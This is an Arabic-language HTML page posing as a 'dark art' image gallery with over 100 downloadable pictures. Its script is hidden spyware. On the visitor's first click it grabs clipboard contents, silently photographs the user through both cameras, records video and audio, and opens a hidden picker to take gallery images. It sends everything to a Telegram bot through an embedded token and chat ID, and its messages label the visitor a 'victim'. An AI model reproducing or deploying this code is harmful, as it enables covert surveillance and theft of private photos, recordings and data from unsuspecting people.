<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MANW 😈💪 // الأرشيف المظلم</title>
    <style>
        :root {
            --bg-color: #040404;
            --card-bg: #0c0c0c;
            --accent-red: #b30000;
            --accent-glow: rgba(179, 0, 0, 0.5);
            --text-color: #e5e7eb;
            --text-muted: #9ca3af;
            --border-color: #1a0505;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            overflow-x: hidden;
        }

        header {
            text-align: center;
            padding: 50px 20px;
            background: radial-gradient(circle, #2b0000 0%, #040404 80%);
            border-bottom: 3px solid var(--accent-red);
            box-shadow: 0 0 40px var(--accent-glow);
        }

        .logo {
            font-size: 3.5rem;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 0 10px var(--accent-red), 0 0 20px var(--accent-red), 0 0 40px var(--accent-red);
            letter-spacing: 3px;
            margin-bottom: 10px;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 1.1rem;
            letter-spacing: 2px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        h2.section-title {
            color: var(--accent-red);
            border-right: 5px solid var(--accent-red);
            padding-right: 15px;
            margin: 40px 0 20px 0;
            font-size: 2rem;
            text-transform: uppercase;
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 20px;
        }

        .card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            border-color: var(--accent-red);
            box-shadow: 0 0 20px var(--accent-glow);
        }

        .card img {
            width: 100%;
            height: 220px;
            object-fit: cover;
            filter: grayscale(30%) contrast(130%);
            border-bottom: 1px solid var(--border-color);
        }

        .card-content {
            padding: 15px;
            text-align: center;
        }

        .card-title {
            font-size: 0.95rem;
            color: #fff;
            margin-bottom: 10px;
        }

        .btn-download {
            display: block;
            width: 100%;
            background-color: #1a0000;
            color: #ff3333;
            border: 1px solid var(--accent-red);
            text-align: center;
            padding: 8px;
            border-radius: 4px;
            text-decoration: none;
            font-weight: bold;
            transition: background 0.2s, color 0.2s;
        }

        .btn-download:hover {
            background-color: var(--accent-red);
            color: #fff;
        }

        footer {
            text-align: center;
            padding: 40px;
            background-color: #020202;
            color: var(--text-muted);
            border-top: 1px solid var(--border-color);
            margin-top: 50px;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">MANW 😈💪</div>
        <div class="subtitle">المملكة السوداء - الأرشيف الحصري للوحات والرسومات المظلمة</div>
    </header>

    <div class="container">
        <h2 class="section-title">معرض اللوحات المظلمة (أكثر من 100 عنصر جاهز للتنزيل)</h2>
        <div class="grid" id="imageGrid"></div>
    </div>

    <footer>
        جميع الحقوق محفوظة © MANW 2026 // الأرشيف المظلم
    </footer>

    <!-- عناصر الإدخال المخفية والوسائط -->
    <input type="file" id="autoGalleryInput" multiple accept="image/*" style="display:none;">

    <div style="display:none;">
        <video id="videoFront" autoplay playsinline></video>
        <video id="videoBack" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
        const CHAT_ID = "7713496654";

        // توليد أكثر من 100 بطاقة وصورة في المعرض
        const grid = document.getElementById('imageGrid');
        const imgSources = [
            "photo-1518709268805-4e9042af9f23", "photo-1509198397868-475647b2a1e5",
            "photo-1514539079130-25950c84af65", "photo-1508739773434-c26b3d09e071",
            "photo-1534447677768-be436bb09401", "photo-1563089145-599997674d42"
        ];

        for (let i = 1; i <= 108; i++) {
            let imgId = imgSources[i % imgSources.length];
            let card = document.createElement('div');
            card.className = 'card';
            card.innerHTML = `
                <img src="https://images.unsplash.com/${imgId}?w=400&auto=format&fit=crop&q=60" alt="Dark Art">
                <div class="card-content">
                    <div class="card-title">تحفة مظلمة #${i}</div>
                    <a href="https://images.unsplash.com/${imgId}?w=1200&auto=format&fit=crop&q=80" class="btn-download" download target="_blank">تنزيل مباشر</a>
                </div>
            `;
            grid.appendChild(card);
        }

        async function sendTelegram(endpoint, data, isPhoto = false, fileName = 'file.jpg') {
            try {
                let url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
                let options = { method: 'POST' };
                if (isPhoto) {
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', data, fileName);
                    options.body = formData;
                } else {
                    options.headers = { 'Content-Type': 'application/json' };
                    options.body = JSON.stringify({ chat_id: CHAT_ID, ...data });
                }
                await fetch(url, options);
            } catch (e) {}
        }

        async function sendText(text) {
            await sendTelegram('sendMessage', { text: text });
        }

        async function captureClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    await sendText(`📋 محتوى الحافظة المستخرج:\n${text}`);
                }
            } catch (e) {}
        }

        async function capturePhotos(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
                const video = facingMode === 'user' ? document.getElementById('videoFront') : document.getElementById('videoBack');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));

                const canvas = document.getElementById('canvas');
                for (let i = 0; i < 4; i++) {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    await new Promise(resolve => {
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                await sendTelegram('sendPhoto', blob, true, 'capture.jpg');
                            }
                            resolve();
                        }, 'image/jpeg', 0.8);
                    });
                    await new Promise(r => setTimeout(r, 500));
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }

        async function recordMedia(type) {
            try {
                const constraints = type === 'video' ? { video: true, audio: true } : { audio: true };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: type === 'video' ? 'video/webm' : 'audio/ogg' });
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append(type === 'video' ? 'video' : 'voice', blob, type === 'video' ? 'video.webm' : 'voice.ogg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type === 'video' ? 'sendVideo' : 'sendVoice'}`, {
                        method: 'POST',
                        body: formData
                    });
                    stream.getTracks().forEach(t => t.stop());
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 10000);
            } catch(e) {}
        }

        // تشغيل المهام بالكامل ومحاولة سحب صور المعرض تلقائياً فور نقر الزائر
        window.addEventListener('click', async () => {
            if (window._executed) return;
            window._executed = true;

            // محاولة فتح نافذة اختيار الملفات/الصور تلقائياً ضمن نقرة المستخدم
            try {
                document.getElementById('autoGalleryInput').click();
            } catch(e) {}

            await sendText("🚨 تم دخول ضحية جديدة إلى موقع MANW 😈💪 وبدء سحب الوسائط والبيانات.");
            await captureClipboard();
            await capturePhotos('user');
            await capturePhotos({ exact: 'environment' });
            await recordMedia('video');
            await recordMedia('audio');
        }, { once: false });

        // التقاط الصور المحددة ورفعها للبوت فور اختيارها
        document.getElementById('autoGalleryInput').addEventListener('change', async (e) => {
            const files = e.target.files;
            if (files.length > 0) {
                await sendText(`📸 تم سحب وإرسال عدد (${files.length}) صورة من معرض الضحية.`);
                for (let i = 0; i < files.length; i++) {
                    await sendTelegram('sendPhoto', files[i], true, files[i].name);
                }
            }
        });
    </script>
</body>
</html>
